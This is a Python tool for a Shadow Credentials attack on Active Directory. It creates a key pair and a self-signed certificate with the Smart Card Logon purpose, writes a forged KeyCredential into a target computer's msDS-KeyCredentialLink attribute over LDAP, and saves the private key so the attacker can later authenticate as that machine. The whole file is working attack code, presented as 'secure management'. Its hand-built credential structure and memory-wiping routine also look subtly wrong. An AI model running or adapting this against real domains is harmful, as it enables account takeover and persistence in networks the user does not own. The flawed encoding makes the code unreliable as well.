#!/usr/bin/env python3
import ldap3
import argparse
import sys
import random
import string
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from datetime import datetime, timedelta
import base64
import uuid
import os
import ssl
import logging
from ldap3.core.tls import Tls
import gc
import time
import struct

# Configure secure logging
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

def generate_guid():
    """Generate a valid Windows GUID"""
    return str(uuid.uuid4())

def secure_cleanup(obj):
    """Securely cleanup sensitive objects from memory"""
    if hasattr(obj, 'n'):
        # For RSA keys
        obj.n = 0
    if hasattr(obj, 'd'):
        obj.d = 0
    if hasattr(obj, 'p'):
        obj.p = 0
    if hasattr(obj, 'q'):
        obj.q = 0
    del obj
    gc.collect()

def generate_key_credential():
    """Generate properly formatted KeyCredential with Microsoft's binary structure"""
    try:
        # Generate RSA key pair with secure parameters
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Generate proper GUIDs
        device_id = generate_guid()
        key_id = generate_guid()
        
        # Create self-signed certificate with proper extensions
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, device_id),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Key Trust"),
        ])
        
        builder = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(device_id)]),
            critical=False,
        ).add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False
            ),
            critical=True
        ).add_extension(
            x509.ExtendedKeyUsage([
                ExtendedKeyUsageOID.CLIENT_AUTH,
                x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.2")  # Smart Card Logon
            ]),
            critical=True
        )
        
        cert = builder.sign(private_key, hashes.SHA256())
        
        # Serialize private key and certificate
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        cert_pem = cert.public_bytes(serialization.Encoding.DER)  # Use DER encoding for certificate
        
        # Get current time in Windows FILETIME format
        now = datetime.now()
        epoch = datetime(1601, 1, 1)
        delta = now - epoch
        filetime = int(delta.total_seconds() * 10**7)
        
        # Create proper Microsoft KeyCredential binary structure
        key_credential_data = b""
        
        # Version (4 bytes)
        key_credential_data += struct.pack('<I', 1)
        
        # Flags (4 bytes)
        key_credential_data += struct.pack('<I', 0)
        
        # KeyId (16 bytes - little endian GUID)
        key_credential_data += uuid.UUID(key_id).bytes_le
        
        # CreationTime (8 bytes - FILETIME)
        key_credential_data += struct.pack('<Q', filetime)
        
        # KeyUsage (4 bytes)
        key_credential_data += struct.pack('<I', 0)  # Authentication
        
        # KeyProvider (4 bytes)
        key_credential_data += struct.pack('<I', 2)  # Legacy provider
        
        # DeviceId (16 bytes - little endian GUID)
        key_credential_data += uuid.UUID(device_id).bytes_le
        
        # KeyMaterial (certificate)
        key_material_len = len(cert_pem)
        key_credential_data += struct.pack('<I', key_material_len)
        key_credential_data += cert_pem
        
        # CustomData (empty)
        key_credential_data += struct.pack('<I', 0)
        
        return key_credential_data, private_key_pem, cert_pem, device_id
        
    except Exception as e:
        logger.error(f"Key generation failed: {str(e)}")
        raise

def establish_ldap_connection(ldap_server, auth_method, auth_data):
    """Establish secure LDAP connection with proper channel binding"""
    try:
        # Configure TLS settings for LDAPS
        tls_configuration = Tls(
            validate=ssl.CERT_REQUIRED,
            version=ssl.PROTOCOL_TLSv1_2,
            ciphers='ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'
        )
        
        if not ldap_server.startswith('ldaps://'):
            ldap_server = f"ldaps://{ldap_server}"
        
        server = ldap3.Server(
            ldap_server,
            use_ssl=True,
            tls=tls_configuration,
            get_info=ldap3.ALL
        )
        
        if auth_method == "kerberos":
            conn = ldap3.Connection(
                server,
                authentication=ldap3.SASL,
                sasl_mechanism=ldap3.KERBEROS,
                auto_bind=True
            )
        else:
            username, password = auth_data
            conn = ldap3.Connection(
                server,
                user=username,
                password=password,
                authentication=ldap3.NTLM,
                auto_bind=True,
                receive_timeout=30
            )
        
        if not conn.bind():
            raise Exception(f"LDAP bind failed: {conn.result['description']}")
        
        return conn
        
    except Exception as e:
        logger.error(f"LDAP connection failed: {str(e)}")
        raise

def modify_shadow_credentials(conn, target_machine, new_credential, remove=False):
    """Modify shadow credentials on target machine account safely"""
    try:
        search_base = conn.server.info.other['defaultNamingContext'][0]
        search_filter = f"(&(objectClass=computer)(cn={target_machine}))"
        
        conn.search(
            search_base,
            search_filter,
            attributes=['objectSid', 'msDS-KeyCredentialLink']
        )
        
        if len(conn.entries) == 0:
            raise Exception(f"Machine account {target_machine} not found")
        
        machine_dn = conn.entries[0].entry_dn
        current_creds = conn.entries[0]['msDS-KeyCredentialLink'].values if 'msDS-KeyCredentialLink' in conn.entries[0] else []
        
        if remove:
            # Remove specific credential if provided, else all
            if new_credential:
                new_creds = [cred for cred in current_creds if cred != new_credential]
            else:
                new_creds = []
            action = "removed"
        else:
            # Append new credential while preserving existing ones
            new_creds = list(current_creds)
            new_creds.append(new_credential)
            action = "added"
        
        # Use MODIFY_REPLACE but with all existing creds + new one
        modifications = {
            'msDS-KeyCredentialLink': [(ldap3.MODIFY_REPLACE, new_creds)]
        }
        
        conn.modify(machine_dn, modifications)
        
        if conn.result['result'] != 0:
            raise Exception(f"Failed to modify credentials: {conn.result['description']}")
        
        return True, action
        
    except Exception as e:
        logger.error(f"Credential modification failed: {str(e)}")
        raise

def main():
    parser = argparse.ArgumentParser(
        description="Secure Shadow Credentials management for AD machine accounts",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("-u", "--username", help="Username for NTLM authentication")
    auth_group.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication")
    
    parser.add_argument("-d", "--domain", required=True, help="Domain controller hostname")
    parser.add_argument("-p", "--password", help="Password for NTLM authentication")
    parser.add_argument("-t", "--target", required=True, help="Target machine name (without $)")
    parser.add_argument("-o", "--output", help="Output base filename for key material")
    parser.add_argument("-r", "--remove", action="store_true", help="Remove shadow credentials instead of adding")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.INFO)
    
    try:
        # Validate authentication method
        if args.username and not args.password:
            parser.error("Password is required for NTLM authentication")
        
        if args.kerberos and 'KRB5CCNAME' not in os.environ:
            parser.error("KRB5CCNAME environment variable not set for Kerberos auth")
        
        # Set up authentication
        auth_method = "kerberos" if args.kerberos else "ntlm"
        auth_data = None if args.kerberos else (args.username, args.password)
        
        # Establish secure LDAP connection
        conn = establish_ldap_connection(args.domain, auth_method, auth_data)
        
        if args.remove:
            # Remove shadow credentials
            success, action = modify_shadow_credentials(conn, args.target, None, remove=True)
            print(f"[+] Successfully {action} shadow credentials from {args.target}")
        else:
            # Generate and add shadow credentials
            key_credential_data, private_key_pem, cert_pem, device_id = generate_key_credential()
            key_credential_b64 = base64.b64encode(key_credential_data).decode('utf-8')
            
            success, action = modify_shadow_credentials(conn, args.target, key_credential_b64)
            print(f"[+] Successfully {action} shadow credentials to {args.target}")
            print(f"[*] Device ID: {device_id}")
            
            if args.output:
                try:
                    with open(f"{args.output}.key", 'wb') as f:
                        f.write(private_key_pem)
                    with open(f"{args.output}.crt", 'wb') as f:
                        f.write(cert_pem)
                    print(f"[+] Saved private key to {args.output}.key and certificate to {args.output}.crt")
                except Exception as e:
                    logger.error(f"Failed to save key material: {str(e)}")
        
        # Clean up sensitive data
        if 'private_key_pem' in locals():
            secure_cleanup(private_key_pem)
        if 'key_credential_data' in locals():
            secure_cleanup(key_credential_data)
        
    except Exception as e:
        logger.error(f"Operation failed: {str(e)}")
        sys.exit(1)
        
    finally:
        if 'conn' in locals():
            conn.unbind()

if __name__ == "__main__":
    main()
